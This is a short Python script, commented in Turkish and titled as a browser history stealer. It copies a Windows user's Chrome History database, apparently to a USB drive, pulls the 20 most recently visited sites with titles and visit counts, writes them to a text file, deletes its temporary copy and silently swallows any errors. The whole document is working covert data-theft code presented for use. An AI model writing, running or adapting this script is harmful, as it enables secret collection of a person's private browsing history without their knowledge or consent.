import os
import sqlite3
import shutil

# --- BROWSER HISTORY STEALER ---
def steal_history():
    username = os.environ.get('USERNAME')
    # Chrome Geçmiş Dosyası Yolu
    db_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    temp_db = "temp_history_db"
    output_file = "TARAYICI_GECMISI.txt"
    
    if os.path.exists(db_path):
        try:
            # Kilitli dosyayı aşmak için USB'ye geçici kopyasını al
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            # Son 20 siteyi çek
            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 20")
            results = cursor.fetchall()
            
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(f"--- {username} KULLANICISININ GEÇMİŞİ ---\n\n")
                for url, title, count in results:
                    f.write(f"Site: {title}\nLink: {url}\nSayac: {count}\n{'-'*30}\n")
            
            conn.close()
            os.remove(temp_db) # Geçici dosyayı sil
        except Exception:
            pass # Hata olursa sessiz kal

if __name__ == "__main__":
    steal_history()